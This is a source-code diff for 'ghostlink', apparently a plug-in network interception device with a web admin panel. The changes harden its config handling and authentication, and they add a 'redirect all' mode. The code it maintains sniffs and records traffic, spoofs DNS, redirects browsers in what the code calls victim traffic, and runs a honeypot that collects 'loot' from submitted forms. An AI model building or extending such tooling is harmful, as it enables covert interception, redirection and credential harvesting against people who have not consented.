-    overrides[k] = (el.type === 'checkbox')
-      ? (el.checked ? 'TRUE' : 'FALSE')
-      : el.value;
-  });
-  Object.keys(overrides).forEach(k => {
-    const re = new RegExp('^' + k.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '=.*$', 'm');
-    const line = k + '=' + overrides[k];
-    if (re.test(txt)) txt = txt.replace(re, line);
-    else              txt += (txt.endsWith('\n') ? '' : '\n') + line + '\n';
-  });
-  return txt;
+  // Start from CFG_RAW (keeps comments and unknown keys), then overlay only the fields
+  // the user changed. Values the form never touched are not written back.
+  return cfgSplice(CFG_RAW || '', cfgDirty());
 }
 async function cfgSave() {
-  const txt = $('#cfgAdv') && $('#cfgAdv').checked ? $('#cfg').value : cfgCollect();
-  CFG_RAW = txt;
-  $('#cfg').value = txt;
-  const r = await api('/api/config', { method:'POST', body: txt });
-  if (r.ok) { toast('saved'); cfgReload(); }
-  else      { toast('save failed', true); }
+  if ($('#cfgAdv') && $('#cfgAdv').checked) {
+    // Raw mode writes exactly what the textarea holds.
+    const r = await api('/api/config', { method:'POST', body: $('#cfg').value });
+    if (r.ok) { toast('saved'); if (r.warnings && r.warnings.length) toast(r.warnings.join(' · '), true); cfgReload(); }
+    else      { toast('save failed', true); }
+    return;
+  }
+  const dirty = cfgDirty();
+  if (!Object.keys(dirty).length) { toast('nothing changed'); return; }
+  // cfgOverlaySet re-reads config.txt first, so switches changed on the Live tab survive.
+  if (await cfgOverlaySet(dirty)) { toast(LAST_SAVE_WARNINGS.length ? 'saved · ' + LAST_SAVE_WARNINGS.join(' · ') : 'saved', LAST_SAVE_WARNINGS.length > 0); cfgReload(); }
+  else                             { toast('save failed', true); }
 }
-function cfgToggleAdvanced() {
+async function cfgToggleAdvanced() {
   const on = $('#cfgAdv').checked;
   $('#cfgForm').style.display = on ? 'none' : 'block';
   $('#cfgRaw').style.display  = on ? 'block' : 'none';
-  if (on) $('#cfg').value = cfgCollect();   // show the raw with current form values
-  else    cfgReload();                       // re-sync form from the latest raw
+  if (on) {
+    // Re-read first: the server also changes keys (AUTO_FORWARD, NET_MODE).
+    const t = await api('/api/config');
+    if (typeof t === 'string') CFG_RAW = t;
+    $('#cfg').value = cfgCollect();   // show the raw with the form's changes applied
+  }
+  else cfgReload();                    // re-sync form from the latest raw
 }
 // backwards-compat shims used by openTab + scriptSave + addSpoof
 async function loadCfg() { await cfgReload(); }
@@ -1968,10 +2320,14 @@ async function addSpoof() {
   else                              txt += '\nREDIRECT=TRUE\n';
   if (/^REDIRECT_FROM=.*$/m.test(txt)) {
     txt = txt.replace(/^REDIRECT_FROM=.*$/m, m => {
-      const [k, v] = m.split('=');
-      const list = (v || '').split(/[,\s]+/).filter(Boolean);
-      if (!list.includes(h)) list.push(h);
-      return k + '=' + list.join(',');
+      // Hostnames only. Drop an inline comment (a "#" after whitespace), then any
+      // token that is not a hostname, such as the "#" or "(comma-sep)" that an
+      // older edit wrote into the list.
+      const eq = m.indexOf('=');
+      const hostLike = t => /^(https?:\/\/)?(\*\.)?[a-z0-9-]+(\.[a-z0-9-]+)*(\/.*)?$/i.test(t);
+      const list = m.slice(eq + 1).replace(/\s#.*$/, '').split(/[,\s]+/).filter(t => t && hostLike(t));
+      if (hostLike(h) && !list.includes(h)) list.push(h);
+      return m.slice(0, eq) + '=' + list.join(',');
     });
   } else { txt += `REDIRECT_FROM=${h}\n`; }
   if (to) {
@@ -2337,20 +2693,40 @@ async function hpClearLoot() {
 
 /* Overlay-write multiple keys into config.txt without clobbering other
    lines. Fetches current config, splices each K=V, posts back. */
+let LAST_SAVE_WARNINGS = [];   // warnings from the last config POST (redirect checks on the server)
 async function cfgOverlaySet(kv) {
   let txt = '';
-  try { const r = await fetch('/api/config', {credentials:'same-origin'}); txt = await r.text(); }
-  catch(e) {}
+  try {
+    const r = await fetch('/api/config', {credentials:'same-origin'});
+    if (!r.ok) throw new Error('GET ' + r.status);
+    txt = await r.text();
+  } catch(e) { return false; }   // never POST a config we could not read
+  txt = cfgSplice(txt, kv);
+  CFG_RAW = txt;
+  const cfg = $('#cfg'); if (cfg) cfg.value = txt;
+  const p = await fetch('/api/config', {method:'POST', credentials:'same-origin',
+                              headers:{'Content-Type':'text/plain'}, body: txt});
+  LAST_SAVE_WARNINGS = await p.json().then(j => j.warnings || [], () => []);
+  if (p.ok) Object.entries(kv).forEach(([k, v]) => cfgSyncKey(k, v));
+  return p.ok;
+}
+// Splice K=V pairs into config text: replace the line if present, else append.
+function cfgSplice(txt, kv) {
   for (const [k, v] of Object.entries(kv)) {
     const line = k + '=' + v;
     const re = new RegExp('^' + k.replace(/[.*+?^${}()|[\]\\]/g,'\\$&') + '=.*$', 'm');
-    if (re.test(txt)) txt = txt.replace(re, line);
+    if (re.test(txt)) txt = txt.replace(re, () => line);   // a function, so a $ in the value is kept
     else txt += (txt.endsWith('\n') ? '' : '\n') + line + '\n';
   }
-  CFG_RAW = txt;
-  const cfg = $('#cfg'); if (cfg) cfg.value = txt;
-  await fetch('/api/config', {method:'POST', credentials:'same-origin',
-                              headers:{'Content-Type':'text/plain'}, body: txt});
+  return txt;
+}
+// Show a saved key in the Config form and mark it as saved.
+function cfgSyncKey(k, v) {
+  $$(`[data-k="${k}"]`).forEach(el => {
+    if (el.type === 'checkbox') el.checked = cfgTruthy(v);
+    else el.value = v;
+    el.dataset.loaded = cfgShown(el);
+  });
 }
 
 async function refreshNetLink() {
@@ -2378,13 +2754,27 @@ async function refreshNetLink() {
   $('#modeForward').classList.toggle('active', mode === 'FORWARD');
   // Forwarded only usable with a cable; keep the button, grey it out
   $('#modeForward').disabled = !eth.carrier;
+  $('#autoFwd').checked = !!d.auto_forward;
+  if (d.auto_forward && eth.carrier && mode !== 'FORWARD') {
+    $('#modeHint').textContent = 'Auto-forwarding is on: frames are cross-copied while the LAN cable is plugged in.';
+  } else
   $('#modeHint').textContent = eth.carrier
     ? (mode === 'FORWARD'
         ? (d.forwarder_running
             ? 'Forwarder is running — eth0 <-> usb0 cross-copy active.'
-            : 'Mode is FORWARD but the forwarder isn’t up yet (watcher polls every 2s).')
+            : 'Forwarder is not running' + (d.forwarder_status ? ': ' + d.forwarder_status : '') + '.')
         : 'LAN cable detected on eth0 — click "Forwarded traffic" to start the forwarder.')
     : 'No LAN cable on eth0 — Forwarded mode is unavailable.';
+}
+
+async function setAutoForward(on) {
+  const r = await api('/api/net/auto', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ auto: !!on }),
+  });
+  if (r.ok) { toast(on ? 'auto-forward on' : 'auto-forward off'); refreshNetLink(); }
+  else      { toast('auto-forward change failed: ' + (r.err||''), true); }
 }
 
 async function setNetMode(mode) {
@@ -2405,29 +2795,22 @@ async function clearRecordsLive() {
 }
 
 async function toggleStream() {
-  let txt = await api('/api/config');
+  // Read the current switch from config.txt, then splice only that key (cfgOverlaySet).
+  const txt = await api('/api/config');
   if (typeof txt !== 'string') return;
-  const re = /^VERDICT_STREAM=.*$/m;
-  const cur = (txt.match(re) || [''])[0];
-  const next = cur.endsWith('TRUE') ? 'VERDICT_STREAM=FALSE' : 'VERDICT_STREAM=TRUE';
-  txt = cur ? txt.replace(re, next) : (txt + '\n' + next + '\n');
-  const r = await api('/api/config', { method:'POST', body: txt });
-  if (r.ok) { toast(next.endsWith('TRUE') ? 'streaming' : 'streaming paused'); tick(); }
-  else      { toast('toggle failed', true); }
+  const next = cfgTruthy(cfgParse(txt).VERDICT_STREAM ?? 'TRUE') ? 'FALSE' : 'TRUE';
+  if (await cfgOverlaySet({ VERDICT_STREAM: next })) { toast(next === 'TRUE' ? 'streaming' : 'streaming paused'); tick(); }
+  else { toast('toggle failed', true); }
 }
 
 async function toggleRecord() {
-  // Flip RECORD_PCAP live. sniff.py mtime-watches config and will wipe/open
-  // pcap files to match within ~1.5 s.
-  let txt = await api('/api/config');
+  // Flip RECORD_PCAP live. sniff.py re-reads config.txt within ~1.5 s and
+  // wipes or opens pcap files to match.
+  const txt = await api('/api/config');
   if (typeof txt !== 'string') return;
-  const re = /^RECORD_PCAP=.*$/m;
-  const cur = (txt.match(re) || [''])[0];
-  const next = cur.endsWith('TRUE') ? 'RECORD_PCAP=FALSE' : 'RECORD_PCAP=TRUE';
-  txt = cur ? txt.replace(re, next) : (txt + '\n' + next + '\n');
-  const r = await api('/api/config', { method:'POST', body: txt });
-  if (r.ok) {
-    toast(next.endsWith('TRUE') ? 'recording' : 'stopped');
+  const next = cfgTruthy(cfgParse(txt).RECORD_PCAP ?? 'TRUE') ? 'FALSE' : 'TRUE';
+  if (await cfgOverlaySet({ RECORD_PCAP: next })) {
+    toast(next === 'TRUE' ? 'recording' : 'stopped');
     tick();
   } else {
     toast('toggle failed', true);
@@ -3275,6 +3658,28 @@ function bindTerminal() {
 
 # ====== helpers =============================================================
 
+def _ipv4_of(name):
+    """'a.b.c.d/len' as `ip -4 addr show` prints it, read with ioctls.
+    Spawning ip for every interface on each poll cost about 80 ms of CPU."""
+    req = struct.pack("256s", name.encode()[:15])
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            addr = socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, req)[20:24])   # SIOCGIFADDR
+            mask = fcntl.ioctl(s.fileno(), 0x891B, req)[20:24]                     # SIOCGIFNETMASK
+    except OSError:
+        return None
+    return f"{addr}/{bin(int.from_bytes(mask, 'big')).count('1')}"
+
+
+def _forwarder_alive():
+    """True while the pid in forwarder.py's pidfile is a live forwarder.py process."""
+    try:
+        pid = int(FORWARDER_PID.read_text().strip())
+        return b"forwarder.py" in Path(f"/proc/{pid}/cmdline").read_bytes()
+    except (OSError, ValueError):
+        return False
+
+
 def ifaces_snapshot():
     out = []
     try:
@@ -3288,13 +3693,7 @@ def ifaces_snapshot():
                               ("rx_p","rx_packets"),("tx_p","tx_packets")):
                     try: stat[k] = int((s/fn).read_text())
                     except Exception: stat[k] = 0
-                ipv4 = None
-                try:
-                    r = subprocess.run(["ip","-4","-o","addr","show","dev",name],
-                                       capture_output=True, text=True, timeout=2)
-                    m = re.search(r"inet (\S+)", r.stdout)
-                    if m: ipv4 = m.group(1)
-                except Exception: pass
+                ipv4 = _ipv4_of(name)
                 mac = None
                 try: mac = Path(f"/sys/class/net/{name}/address").read_text().strip()
                 except Exception: pass
@@ -3440,10 +3839,20 @@ def _timeline(kind, **fields):
             TIMELINE.parent.mkdir(parents=True, exist_ok=True)
             # Hard cap: roll over at 2 MB
             if TIMELINE.exists() and TIMELINE.stat().st_size > 2 * 1024 * 1024:
+                # Keep the newest 512 KB, starting at a whole record. Written to a new file and
+                # renamed, so a power cut here cannot leave the timeline empty or half-written, and
+                # a reader that has the old file open keeps reading the old, complete copy.
                 tail = TIMELINE.read_bytes()[-512*1024:]
-                TIMELINE.write_bytes(tail)
+                nl = tail.find(b"\n")
+                tail = tail[nl + 1:] if nl >= 0 else b""
+                tmp = TIMELINE.with_name(TIMELINE.name + ".tmp")
+                tmp.write_bytes(tail); tmp.replace(TIMELINE)
             with open(TIMELINE, "a") as f:
-                f.write(json.dumps(rec)[:1024] + "\n")
+                line = json.dumps(rec)
+                # A cut-off record is not JSON, so keep a short valid one instead.
+                if len(line) > 1024:
+                    line = json.dumps({"t": rec["t"], "ts": rec["ts"], "kind": kind, "truncated": True})
+                f.write(line + "\n")
     except Exception: pass
 
 
@@ -3454,6 +3863,125 @@ def _ip_as_int(s):
         return (parts[0]<<24) | (parts[1]<<16) | (parts[2]<<8) | parts[3]
     except Exception:
         return None
+
+
+# ---- SD card and redirect checks: used by /api/status, the save path and startup ----
+SD_MOUNT = "/mnt/sdcard"
+_HOSTNAME_RE = re.compile(r"^(\*\.)?[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)*$")
+_MMC_PART_RE = re.compile(r"^/dev/mmcblk\d+p\d+$")
+
+
+def sd_status():
+    """The SD card as the mount table and the kernel see it right now."""
+    st = {"present": False, "mounted": False, "mount": "", "device": "", "fstype": "",
+          "readonly": False, "size_mb": 0, "free_mb": 0}
+    try:
+        with open("/proc/mounts") as fh:
+            for line in fh:
+                f = line.split()
+                if len(f) >= 4 and _MMC_PART_RE.match(f[0]) and f[1].startswith("/mnt"):
+                    st.update(mounted=True, mount=f[1], device=f[0], fstype=f[2],
+                              readonly=f[3].split(",")[0] == "ro")
+                    break
+    except OSError:
+        pass
+    # A removable mmc device means a card is in the slot, even when it is not mounted.
+    try:
+        for name in os.listdir("/sys/block"):
+            if name.startswith("mmcblk"):
+                with open(f"/sys/block/{name}/removable") as fh:
+                    if fh.read().strip() == "1":
+                        st["present"] = True
+    except OSError:
+        pass
+    st["present"] = st["present"] or st["mounted"]
+    if st["mounted"]:
+        try:
+            vs = os.statvfs(st["mount"])
+            st["size_mb"] = int(vs.f_blocks * vs.f_frsize / 1048576)
+            st["free_mb"] = int(vs.f_bavail * vs.f_frsize / 1048576)
+        except OSError:
+            pass
+    return st
+
+
+def redirect_hosts(raw):
+    """REDIRECT_FROM as hostnames. Returns (hosts, dropped); comments and junk are dropped."""
+    hosts, dropped, seen = [], [], set()
+    for tok in (raw or "").split(","):
+        t = re.split(r"\s+#", tok.strip(), maxsplit=1)[0].strip().lower()
+        if not t:
+            continue
+        if _HOSTNAME_RE.match(t):
+            if t not in seen:
+                hosts.append(t)
+                seen.add(t)
+        else:
+            dropped.append(tok.strip())
+    return hosts, dropped
+
+
+def redirect_is_loop(to, hosts):
+    """True when REDIRECT_TO is one of the REDIRECT_FROM hosts, or inside one of them."""
+    h = re.sub(r"^[a-z]+://", "", (to or "").strip().lower()).split("/")[0].split(":")[0]
+    if not h:
+        return False
+    for pat in hosts:
+        p = pat.lstrip("*.")
+        if h == p or h.endswith("." + p):
+            return True
+    return False
+
+
+def _normalize_redirect_body(body):
+    """Save-time check of config.txt bytes: drop junk from REDIRECT_FROM and warn about a
+    REDIRECT_TO that loops. Returns (body, warnings)."""
+    warns = []
+    try:
+        lines = body.decode("utf-8", "replace").split("\n")
+    except Exception:
+        return body, warns
+    to, hosts, dropped_all = "", [], []
+    for i, line in enumerate(lines):
+        key, sep, val = line.partition("=")
+        key = key.strip()
+        if key == "REDIRECT_FROM" and sep:
+            hosts, dropped = redirect_hosts(val)
+            dropped_all += dropped
+            eol = "\r" if line.endswith("\r") else ""
+            lines[i] = "REDIRECT_FROM=" + ",".join(hosts) + eol
+        elif key == "REDIRECT_TO" and sep:
+            to = re.split(r"\s+#", val.strip(), maxsplit=1)[0].strip()
+    if dropped_all:
+        warns.append("REDIRECT_FROM: removed " + ", ".join(dict.fromkeys(dropped_all)) + " (not hostnames)")
+    if redirect_is_loop(to, hosts):
+        warns.append("REDIRECT_TO " + to + " is one of the REDIRECT_FROM hosts, so those visitors are refused and the redirect loops. Change REDIRECT_TO or the list.")
+    return "\n".join(lines).encode("utf-8"), warns
+
+
+def dnsmasq_running():
+    try:
+        with open("/run/ghostlink-dnsmasq.pid") as fh:
+            pid = int(fh.read().strip())
+        with open(f"/proc/{pid}/cmdline", "rb") as fh:
+            return b"dnsmasq" in fh.read()
+    except (OSError, ValueError):
+        return False
+
+
+def redirect_info(cfg):
+    """State for the Redirect tab: on/off, dnsmasq, the usable host list, and warnings."""
+    on = (cfg.get("REDIRECT", "FALSE") or "").strip().upper() == "TRUE"
+    to = (cfg.get("REDIRECT_TO", "") or "").strip()
+    hosts, dropped = redirect_hosts(cfg.get("REDIRECT_FROM", "") or "")
+    warns = []
+    if dropped:
+        warns.append("REDIRECT_FROM has entries that are not hostnames (" + ", ".join(dict.fromkeys(dropped)) + "). They are removed on the next save.")
+    if on and not to:
+        warns.append("REDIRECT is on but REDIRECT_TO is empty, so no redirect happens.")
+    if redirect_is_loop(to, hosts):
+        warns.append("REDIRECT_TO " + to + " is one of the REDIRECT_FROM hosts, so those visitors are refused.")
+    return {"on": on, "dnsmasq": dnsmasq_running(), "hosts": hosts, "to": to, "warnings": warns}
 
 
 def _ip_collides(ip, cfg):
@@ -3468,8 +3996,10 @@ def _ip_collides(ip, cfg):
     try:
         r = subprocess.run(["ip","-4","-o","addr","show","dev",iface],
                            capture_output=True, text=True, timeout=2)
+        own = (cfg.get("HONEYPOT_IP", "") or "").strip()
         for m in re.finditer(r"inet (\d+\.\d+\.\d+\.\d+)/", r.stdout):
-            if _ip_as_int(m.group(1)) == v:
+            # The honeypot's own secondary address is on this interface already; it is not a collision.
+            if _ip_as_int(m.group(1)) == v and m.group(1) != own:
                 return True
     except Exception: pass
     # 2) DHCP range (DHCP_RANGE=lo,hi,mask,ttl)
@@ -3553,21 +4083,30 @@ def _honeypot_emit_verdict(rec):
     VER_DIR.mkdir(parents=True, exist_ok=True)
     # Reuse the newest verdict ring file so we don't fight sniff.py's
     # rotation; create one if none exist yet.
-    files = sorted(VER_DIR.glob("rec_*.jsonl"), key=lambda p: p.stat().st_mtime, reverse=True)
+    files = sorted(VER_DIR.glob("rec_*.jsonl"), key=_rec_index, reverse=True)
     if files:
         target = files[0]
     else:
         target = VER_DIR / "rec_000000.jsonl"
+    # This endpoint takes POSTs from anyone who reaches it, and the sniffer's size cap does not
+    # count these lines, so a cap of its own keeps them from growing the file without limit.
     try:
+        if target.exists() and target.stat().st_size > 1024 * 1024: return
+        # Compact separators, as sniff.py writes them: /api/query matches the text "rule":"X".
         with open(target, "a") as f:
-            f.write(json.dumps(rec) + "\n")
+            f.write(json.dumps(rec, separators=(",", ":")) + "\n")
     except Exception: pass
 
 
+def _rec_index(p):
+    """Capture number from rec_NNNNNN.*: the order files were made in. Used instead of mtime,
+    because a device with no clock writes 1970 timestamps."""
+    try: return int(Path(p).stem.split("_")[1])
+    except (IndexError, ValueError): return -1
+
+
 def tail_verdicts(n=50):
-    try:
-        files = sorted(VER_DIR.glob("rec_*.jsonl"), key=lambda p: p.stat().st_mtime, reverse=True)
-    except Exception: return []
+    files = sorted(VER_DIR.glob("rec_*.jsonl"), key=_rec_index, reverse=True)   # newest first
     lines = []
     for f in files[:2]:
         try:
@@ -3579,8 +4118,13 @@ def tail_verdicts(n=50):
         if len(lines) >= n: break
     out = []
     for s in lines[-n:]:
-        try: out.append(json.loads(s))
-        except Exception: pass
+        try: rec = json.loads(s)
+        except Exception: continue
+        # The admin UI polls /api/live from this device, so its own requests
+        # can land here as verdicts. Not victim traffic: hide them (records
+        # already on disk keep them until they rotate out).
+        if isinstance(rec, dict) and str(rec.get("host", "")).lower().split(":")[0] in admin_hosts(): continue
+        out.append(rec)
     return out
 
 
@@ -3599,20 +4143,182 @@ def uptime_str():
 # records at us, we land on :80 here, and we decide 302 vs serve-UI from the
 # Host header.
 
+# The device's own names. The admin UI lives under these, so they are never
+# redirected, and their traffic is never shown as victim traffic in the Live tab.
+# Every check uses admin_hosts(): these fixed names plus, once the LAN detector
+# has verified it, the device's LAN IP. ADMIN_HOSTS is only the fixed base; it
+# stays so tests/test_redirect_all.py can still iterate the fixed device names.
+ADMIN_HOSTS_FIXED = ("172.32.0.93", "ghostlink.local", "localhost", "127.0.0.1")
+ADMIN_HOSTS = ADMIN_HOSTS_FIXED
+
+# The LAN IP the device binds once its LAN detector succeeds. lan_detect writes
+# LAN_DETECT_PATH. The file is missing, stale or junk until detection succeeds,
+# and then nothing is added.
+LAN_DETECT_PATH = Path("/tmp/ghostlink.lan.json")
+LAN_IP_TTL = 5.0            # seconds between reads of the file (webui is a hot path)
+_lan_ip_cache = ((), 0.0)   # (ips, read_at)
+
+
+def _read_lan_ip():
+    """The LAN IP in LAN_DETECT_PATH when it is a verified, usable IPv4 address,
+    else None. Never raises: any problem reading or checking the file gives None."""
+    try:
+        # /tmp is world-writable. Trust only a regular file that root owns and that
+        # no group or other user can write, so a planted file cannot put an
+        # attacker's address on the admin allowlist. O_NOFOLLOW refuses symlinks.
+        fd = os.open(str(LAN_DETECT_PATH), os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
+        with os.fdopen(fd, "rb") as f:
+            st = os.fstat(f.fileno())
+            if not stat.S_ISREG(st.st_mode): return None
+            if os.name == "posix" and (st.st_uid != 0 or (st.st_mode & 0o022)): return None
+            data = json.loads(f.read(4096).decode("utf-8"))
+    except Exception:
+        return None
+    if not isinstance(data, dict) or data.get("detected") is not True: return None
+    ip = data.get("suggested_ip")
+    if not isinstance(ip, str): return None
+    try:
+        addr = ipaddress.IPv4Address(ip)
+    except ValueError:
+        return None
+    if (addr.is_unspecified or addr.is_loopback or addr.is_multicast
+            or addr.is_reserved or addr.is_link_local):
+        return None
+    ip = str(addr)
+    return None if ip in ADMIN_HOSTS_FIXED else ip
+
+
+def lan_admin_ips():
+    """(ip,) while LAN_DETECT_PATH vouches for a LAN IP, else (). Re-read at most
+    every LAN_IP_TTL seconds; a clock that jumped backwards forces a re-read."""
+    global _lan_ip_cache
+    ips, read_at = _lan_ip_cache
+    now = time.time()
+    if 0 <= now - read_at < LAN_IP_TTL:
+        return ips
+    ip = _read_lan_ip()
+    ips = (ip,) if ip else ()
+    _lan_ip_cache = (ips, now)
+    return ips
+
+
+def admin_hosts():
+    """The device's own admin names and addresses: the fixed set, plus the LAN IP
+    once it is verified. Use this for every admin-host check."""
+    return ADMIN_HOSTS_FIXED + lan_admin_ips()
+
+
 def should_redirect(host_hdr: str, cfg: dict):
     if not host_hdr: return None
     if cfg.get("REDIRECT", "FALSE").upper() != "TRUE": return None
     pats = [p.strip().lower() for p in (cfg.get("REDIRECT_FROM","") or "").split(",") if p.strip()]
     if not pats: return None
+    to = (cfg.get("REDIRECT_TO", "") or "").strip()
+    if not to: return None  # REDIRECT_TO is required; don't fall back to device
     h = host_hdr.split(":")[0].strip().lower()
-    # 172.32.0.93 and ghostlink.local are always "local admin" — never redirect
-    if h in ("172.32.0.93", "ghostlink.local", "localhost", "127.0.0.1"): return None
+    # admin_hosts() are always "local admin" — never redirect
+    if h in admin_hosts(): return None
     for p in pats:
         p = p.lower()
         if p.startswith("http://"):  p = p[7:]
         if p.startswith("https://"): p = p[8:]
         p = p.split("/")[0]
-        if h == p or h.endswith("." + p): return cfg.get("REDIRECT_TO", "172.32.0.93")
+        if h == p or h.endswith("." + p): return to
+    return None
+
+
+# -------- "redirect all" decision -------------------------------------------
+# A second mode: when REDIRECT_ALL=TRUE, every host that isn't the device
+# itself, an exempt domain, or the target is 302'd to one target URL. The DNS
+# half (steer every name at usb0) is ghostlink.sh's job; this is the HTTP half.
+
+# Hosts that keep working when "redirect all" is on: the chat, Windows
+# connectivity probes, and Windows Update. Suffix-matched like the rule itself.
+REDIRECT_ALL_DEFAULT_EXEMPT = ("anthropic.com,claude.ai,claude.com,claudeusercontent.com,"
+                               "msftconnecttest.com,msftncsi.com,windowsupdate.com")
+
+
+def redirect_exempt_hosts(raw):
+    """REDIRECT_EXEMPT as a clean list: each entry trimmed, lowercased, empties
+    dropped, duplicates removed. Returns (hosts, bad); `bad` holds entries that
+    contain a space or a slash and so are rejected on save."""
+    hosts, bad, seen = [], [], set()
+    for tok in (raw or "").split(","):
+        t = tok.strip().lower()
+        if not t:
+            continue
+        if any(c in t for c in (" ", "\t", "/")):
+            bad.append(tok.strip())
+            continue
+        if t not in seen:
+            hosts.append(t); seen.add(t)
+    return hosts, bad
+
+
+def _host_in_list(h, hosts):
+    """Suffix match used by the exempt and target checks: h == d or h is a
+    subdomain of d (h endswith "." + d), for any d in hosts."""
+    for d in hosts:
+        d = d.lstrip("*.")
+        if d and (h == d or h.endswith("." + d)):
+            return True
+    return False
+
+
+def redirect_all_target(cfg):
+    """REDIRECT_ALL_TO parsed. Returns (url, host) when it is an http:// or
+    https:// URL with a host, else (None, "")."""
+    to = (cfg.get("REDIRECT_ALL_TO", "") or "").strip()
+    if not to:
+        return None, ""
+    try:
+        u = urlparse(to)
+    except Exception:
+        return None, ""
+    if u.scheme not in ("http", "https") or not u.hostname:
+        return None, ""
+    return to, u.hostname.lower()
+
+
+def should_redirect_all(host_hdr, cfg):
+    """Decide the "redirect all" 302. Returns REDIRECT_ALL_TO when `host_hdr`
+    is a foreign host while the mode is on, else None. The device's own names
+    (admin_hosts()), the exempt domains, and the target host itself are never
+    redirected — so the admin UI, the chat, and the target all keep working."""
+    if not host_hdr:
+        return None
+    if (cfg.get("REDIRECT_ALL", "FALSE") or "").strip().upper() != "TRUE":
+        return None
+    to, to_host = redirect_all_target(cfg)
+    if not to:
+        return None  # required and must be a valid URL; never redirect without it
+    h = host_hdr.split(":")[0].strip().lower()
+    if not h or h in admin_hosts():
+        return None
+    # An empty REDIRECT_EXEMPT means the default list, as in ghostlink.sh, so the
+    # DNS and HTTP sides always agree on which domains are exempt.
+    exempt, _ = redirect_exempt_hosts(cfg.get("REDIRECT_EXEMPT", "") or REDIRECT_ALL_DEFAULT_EXEMPT)
+    if _host_in_list(h, exempt):
+        return None
+    if to_host and _host_in_list(h, [to_host]):   # target is always exempt — no loop
+        return None
+    return to
+
+
+def validate_redirect_all(cfg):
+    """Save-time gate for the "redirect all" keys. Returns an error string (the
+    save is rejected and nothing is written) or None when the settings are
+    usable. Exempt entries are checked even when the mode is off, so a bad one
+    can't sit in the file waiting to bite when the mode is turned on."""
+    _, bad = redirect_exempt_hosts(cfg.get("REDIRECT_EXEMPT", ""))
+    if bad:
+        return ("REDIRECT_EXEMPT entries may not contain spaces or slashes: "
+                + ", ".join(dict.fromkeys(bad)))
+    if (cfg.get("REDIRECT_ALL", "FALSE") or "").strip().upper() == "TRUE":
+        to, _host = redirect_all_target(cfg)
+        if not to:
+            return ("REDIRECT_ALL is on, so REDIRECT_ALL_TO must be a full "
+                    "http:// or https:// URL with a host (e.g. https://example.com).")
     return None
 
 
@@ -3654,6 +4360,7 @@ button:hover { background:#1557b0; }
 # ====== HTTP handler ========================================================
 
 class Handler(http.server.BaseHTTPRequestHandler):
+    timeout = 30   # a stalled or vanished client must not hold its thread and socket forever
     def log_message(self, *a, **k): pass
 
     def _send(self, code, ctype, body, extra=None):
@@ -3714,10 +4421,20 @@ class Handler(http.server.BaseHTTPRequestHandler):
         request must carry a valid session. Default FALSE preserves the
         pre-auth behavior for /api/config / /api/clone / /api/honeypot
         etc. — flipping it on turns the device into a locked-down
-        appliance without touching every endpoint."""
+        appliance without touching every endpoint.
+
+        That default assumed the device was only reachable over the
+        isolated point-to-point USB link (172.32.0.93) or localhost. Once
+        the LAN detector binds a real LAN IP (admin_hosts() grows beyond
+        the fixed set), every host on that LAN can reach this gate too, so
+        auth is forced on regardless of the config flag — the no-auth
+        default is for the single-PC USB link, not a shared network."""
         try: cfg = load_cfg()
         except Exception: cfg = {}
-        if cfg.get("WEBUI_REQUIRE_AUTH","FALSE").upper() != "TRUE":
+        require = cfg.get("WEBUI_REQUIRE_AUTH","FALSE").upper() == "TRUE"
+        if not require and lan_admin_ips():
+            require = True
+        if not require:
             return True
         return self._require_auth()
 
@@ -3801,7 +4518,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
             # (b) Host-based intercept. Only triggers for OTHER host names —
             # hitting the admin IP by name/host never serves the honeypot.
             if not host: return False
-            if host in ("172.32.0.93", "ghostlink.local", "localhost", "127.0.0.1"): return False
+            if host in admin_hosts(): return False
             pats = [p.strip().lower() for p in (cfg.get("REDIRECT_FROM","") or "").split(",") if p.strip()]
             for r in _honeypot_rules(cfg):
                 if r.get("trigger") == "WEBSITE_VISIT" and r.get("host"):
@@ -3859,11 +4576,29 @@ document.addEventListener('submit', function(e){
         host = self.headers.get("Host", "")
         cfg = load_cfg()
         to = should_redirect(host, cfg)
-        if to is None: return False
+        if to is None:
+            # No per-URL rule matched. If "redirect all" is on, every host that
+            # isn't the device, an exempt domain, or the target goes to the one
+            # target. Location is the bare target (no victim path is copied).
+            to_all = should_redirect_all(host, cfg)
+            if to_all is None: return False
+            self.send_response(302)
+            self.send_header("Location", to_all)
+            self.send_header("Content-Length", "0")
+            self.send_header("Cache-Control", "no-store")
+            self.send_header("Connection", "close")
+            self.end_headers()
+            try:
+                with open(LOG_PATH, "a") as f:
+                    f.write(f"{time.strftime('%H:%M:%S')} webui 302 ALL Host={host} path={self.path} -> {to_all}\n")
+            except Exception: pass
+            _timeline("redirect_all", host=host, ip=self._client_ip(), to=to_all[:200])
+            return True
         if not to.startswith("http"): to = "http://" + to
         # Loop guard: if the destination host is itself a REDIRECT_FROM
         # pattern, we'd just send the browser back to ourselves. Refuse
-        # and serve the UI instead (so the admin sees the misconfiguration).
+        # with a 404. Serving the admin UI here handed the device's own
+        # pages to the victim; the admin sees the refusal in the log.
         try:
             to_host = (urlparse(to).hostname or "").lower()
         except Exception:
@@ -3874,14 +4609,18 @@ document.addEventListener('submit', function(e){
             if pp.startswith("http://"):  pp = pp[7:]
             if pp.startswith("https://"): pp = pp[8:]
             pats_norm.append(pp.split("/")[0])
+        # The fixed admin IP and the verified LAN IP are refused as targets. The
+        # hostnames are not added here, so this check keeps its old behaviour.
         if to_host and (to_host in pats_norm or
                         any(to_host.endswith("." + p) for p in pats_norm) or
-                        to_host == "172.32.0.93"):
+                        to_host == "172.32.0.93" or to_host in lan_admin_ips()):
             try:
                 with open(LOG_PATH, "a") as f:
-                    f.write(f"{time.strftime('%H:%M:%S')} webui REFUSE self-redirect loop Host={host} -> {to}\n")
+                    f.write(f"{time.strftime('%H:%M:%S')} webui REFUSE self-redirect loop Host={host} -> {to} (404, no redirect, UI not served)\n")
             except Exception: pass
-            return False  # fall through to serve UI
+            # Denied means denied: no 302 and no admin UI on a spoofed host.
+            self._send(404, "text/plain; charset=utf-8", "Not Found")
+            return True
         preserve = cfg.get("REDIRECT_PRESERVE_PATH","TRUE").upper() == "TRUE"
